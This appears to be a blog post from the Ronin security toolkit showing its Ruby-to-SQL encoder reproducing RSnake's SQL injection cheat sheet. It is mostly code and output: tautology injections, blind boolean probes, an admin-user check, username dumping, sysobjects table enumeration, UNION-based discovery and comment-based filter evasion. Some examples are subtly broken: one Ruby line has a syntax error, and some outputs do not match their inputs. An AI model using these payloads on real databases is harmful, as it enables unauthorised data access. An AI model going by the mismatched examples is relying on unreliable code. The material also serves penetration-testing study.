---
layout: post
title: RSnakes SQLi Cheat Sheet using Ronin SQL
author: postmodern
---

One of the planned features listed in the [Spring Cleaning Campaign (2010)][1]
was a simple Ruby->SQL encoder for the [Ronin SQL][ronin-sql] library,
to replace the overly complex Ronin SQL DSL. This encoder would format
Ruby Integers, Strings, Arrays and Hashes into fragments of proper SQL.

The Ruby->SQL encoder has gotten to the point of being able to recreate most of
the examples from [RSnake's SQL Injection Cheat Sheet][2]:

Load `ronin/code/sql`:

{% highlight ruby %}
require 'ronin/code/sql' 
include Ronin

sql = Code.sql
{% endhighlight %}

Normal SQL Injection:

{% highlight ruby %}
sql[1, :or, 1, :eq, 1].to_sql
# => "1 or 1 = 1"
{% endhighlight %}

Normal SQL Injection using encapsulated data:

{% highlight ruby %}
sql['1', :or '1', :eq, '1'].to_sql
# => "'1' or '1' = '1'"
{% endhighlight %}

Blind SQL Injection creating an error using EXEC:

{% highlight ruby %}
sql[1, :exec, :sp_, [sql[:or, :exec, :xp_]]].to_sql
# => "1 exec sp_ (or exec xp_)"
{% endhighlight %}

Blind SQL Injection detection:

{% highlight ruby %}
sql[1, :and, 1, :eq, 1].to_sql
# => "1 and 1 = 1"
{% endhighlight %}

Blind SQL Injection to attempt to locate `table_name` by brute-force
iteration through table name permutations:

{% highlight ruby %}
sql['1', :and, 1, :eq, [sql[:select, sql.count(:all), :from, :table_name]]].to_sql
# => "'1' and 1 = (select count(*) from tablenames)"
{% endhighlight %}

Using the `USER_NAME()` function in SQL Server to tell us if the user is
running as the administrator:

{% highlight ruby %}
sql[1, :and, sql.user_name(), :eq, 'dbo'].to_sql
# => "1 and user_name() = 'dbo'"
{% endhighlight %}

Creating errors by calling non-existant tables:

{% highlight ruby %}
sql[1, :and, :non_existant_table, :eq, '1'].to_sql
# => "1 and non_existant_table = '1'"
{% endhighlight %}

Dumping usernames:

{% highlight ruby %}
sql[:or, :username, :is, :not, nil, :or, :username, :eq].to_sql
# => "or username is not null or username ="
{% endhighlight %}

Enumerating through database table names:

{% highlight ruby %}
sql[1, :and, sql.ascii(
  sql.lower(
    sql.substring(
      [sql[:select, :top, 1, :name, :from, :sysObjects, :where, :xtype, :eq, 'U']], 1, 1
    )
  )
), :gt, 116].to_sql
# => "1 and ascii(lower(substring((select top 1 name from sysobjects where xtype = 'U'),1,1))) > 116"
{% endhighlight %}

Finding user supplied tables using the `sysObjects` table in SQL Server:

{% highlight ruby %}
sql[1, :union, :all, :select, [1,2,3,4,5,6,:name], :from, :sysObjects, :where, :xtype, :eq, 'U'].to_sql
# => "1 union * select (1,2,3,4,5,6,name) from sysObjects where xtype = 'U'"
{% endhighlight %}

Bypassing filter using `/**/` instead of spaces:

{% highlight ruby %}
stmt = sql[1, :union, :select, :all, :from, :where]
stmt.to_sql
# => "1 union select * from where"

stmt.to_sql(:spaces => false)
# => "1/**/union/**/select/**/*/**/from/**/where"
{% endhighlight %}

<div class="note">
  <p>
  I cheated a little by leaving off the prefix/suffix tick-marks used in
  SQL injections, but you get the general idea.
  </p>
</div>

New SQL fragments are created using the `sql[...]` syntax, and new SQL
function calls are created with `sql.func_name`. Note, that you can nest
SQL fragments by using the `[sql[...]]` or `[sql.func_name(....)]` syntax.

[1]: /blog/2010/01/12/spring-cleaning.html
[2]: http://ha.ckers.org/sqlinjection/

[ronin-sql]: https://github.com/ronin-ruby/ronin-sql#readme
